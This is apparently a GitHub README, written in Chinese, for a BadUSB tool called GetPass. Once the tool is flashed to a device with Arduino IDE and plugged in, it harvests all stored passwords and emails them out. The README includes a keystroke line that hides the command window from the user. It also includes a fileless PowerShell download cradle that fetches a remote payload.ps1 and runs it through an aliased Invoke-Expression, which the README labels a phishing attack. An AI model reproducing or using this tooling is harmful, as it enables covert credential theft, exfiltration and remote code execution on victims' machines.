# GetPass
插入badusb设备自动将获取到的所有密码写到文件然后发送到邮箱中,把badusb_GetPass.ino烧录到badusb设备。

GetPass.exe
获取所有密码

PassUP.ps1
上传文件到邮箱

需要用到烧录工具Arduino  IDE

打开Arduino选择“工具”--->"开发板"----->"Arduino Leonaedo"，选择badusb设备的"端口"

## 可使用最小化隐藏cmd窗口
```
  Keyboard.println("CMD /t:01 /k @ECHO OFF && MODE CON:cols=15 lines=1");   //使用最小化隐藏cmd窗口
```
## 攻击 - 钓鱼攻击 - 文件下载），实现全程无落地文件✈
```
  Keyboard.println("echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring('http://IP/payload.ps1') | powershell -");
```


运行实例
![image](https://github.com/kissgeek/GetPass/blob/master/image/GetPass.png)
